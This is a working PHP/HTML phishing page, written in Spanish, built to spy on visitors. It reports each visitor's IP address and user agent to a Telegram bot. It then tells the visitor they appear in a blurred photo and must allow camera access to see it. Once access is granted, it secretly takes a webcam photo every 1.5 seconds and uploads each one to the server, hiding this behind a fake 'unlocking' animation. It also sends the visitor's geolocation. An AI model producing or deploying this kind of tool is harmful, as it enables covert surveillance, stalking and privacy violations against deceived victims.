<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "👋 <b>Nueva visita</b>\n".
       "📌 IP: $ip\n".
       "🖥️ UA: $ua\n".
       "⏰ Hora: $ts";
send_to_telegram($msg);
?>

<!doctype html>
<html>
<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        body {
            margin:0;
            font-family: Arial, sans-serif;
            background: #000;
            height: 100vh;
            overflow: hidden;
        }

        /* Imagen censurada inicial */
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: url('img/image.jpg') no-repeat center center/cover;
            filter: blur(15px) brightness(0.5);
            z-index: -1;
            transition: all 0.8s ease;
        }

        /* Imagen normal cuando se desbloquea */
        body.unlocked::before {
            filter: none;
            brightness: 1;
        }

        /* Modal permisos */
        #cameraModal {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        #cameraModal .content {
            background: #fff;
            color: #000;
            padding: 30px;
            border-radius: 10px;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        #grantAccess {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #FF0000;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.2s;
        }
        #grantAccess:hover {
            background-color: #cc0000;
        }

        /* Modal animación desbloqueo */
        #unlockModal {
            display: none;
            position: fixed;
            top:0; left:0;
            width:100%; height:100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9998;
            flex-direction: column;
            color: #fff;
            font-size: 24px;
        }

        /* Círculo girando */
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #ff0000;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 1s linear infinite;
            margin-top: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }
    </style>
</head>
<body>

<!-- Modal permisos -->
<div id="cameraModal">
    <div class="content">
        <h2>¡Atención!</h2>
        <p>📸 ¡Wow! Apareces en la imagen de fondo… ¿seguro que no eres tú? Da acceso a tu cámara para poder ver la foto completa y guardarla.</p>
        <button id="grantAccess">Permitir acceso</button>
    </div>
</div>

<!-- Modal animación desbloqueo -->
<div id="unlockModal">
    <div>Desbloqueando imagen...</div>
    <div class="spinner"></div>
</div>

<!-- Video y Canvas ocultos para tomar fotos -->
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
'use strict';

// Función para enviar foto al servidor
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}

// Configuración cámara
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };

// Captura fotos cada 1.5 segundos
function capturePhotoLoop() {
    const context = canvas.getContext('2d');
    setInterval(function(){
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

// Al presionar "Permitir acceso"
document.getElementById('grantAccess').addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        capturePhotoLoop();

        // Ocultar modal permisos
        document.getElementById('cameraModal').style.display = 'none';

        // Mostrar animación desbloqueo 5 segundos
        const unlockModal = document.getElementById('unlockModal');
        unlockModal.style.display = 'flex';
        setTimeout(() => {
            unlockModal.style.display = 'none';
            document.body.classList.add('unlocked'); // Mostrar imagen desbloqueada
        }, 5000);

    } catch (e) {
        // Si rechaza, el modal vuelve a aparecer
        alert("Debes permitir el acceso a la cámara para desbloquear la imagen.");
        document.getElementById('cameraModal').style.display = 'flex';
    }
});

// Obtener ubicación y enviarla automáticamente
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude, longitude, accuracy } = pos.coords;
        fetch('location.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, accuracy })
        });
    });
}
</script>

</body>
</html>
